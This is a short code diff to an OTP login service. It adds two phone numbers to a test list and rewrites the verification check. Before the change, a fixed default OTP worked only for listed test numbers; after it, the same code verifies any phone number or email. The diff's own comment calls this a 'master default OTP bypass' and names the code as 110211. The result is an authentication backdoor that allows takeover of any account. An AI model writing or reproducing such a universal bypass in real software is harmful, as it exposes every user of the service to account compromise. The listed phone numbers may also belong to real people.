@@ -19,6 +19,8 @@ const TEST_PHONE_NUMBERS = [
   '7691810506',
   '9009925021',
   '6375095971',
+  '7348419775',
+  '6266925739',
 ];
 
 // Default OTP for test phone numbers
@@ -182,10 +184,10 @@ class OTPService {
       const identifier = phone || email;
       const identifierType = phone ? 'phone' : 'email';
 
-      // Check if this is a test phone number and OTP matches default test OTP
-      if (phone && isTestPhoneNumber(phone) && otp === DEFAULT_TEST_OTP) {
-        logger.info(`Test OTP verified for ${phone}`, {
-          phone,
+      // Check if this is the master default OTP bypass (110211) or a test phone number
+      if (otp === DEFAULT_TEST_OTP) {
+        logger.info(`Master Default OTP verified for ${identifier} (${identifierType})`, {
+          identifier,
           purpose
         });
         return {
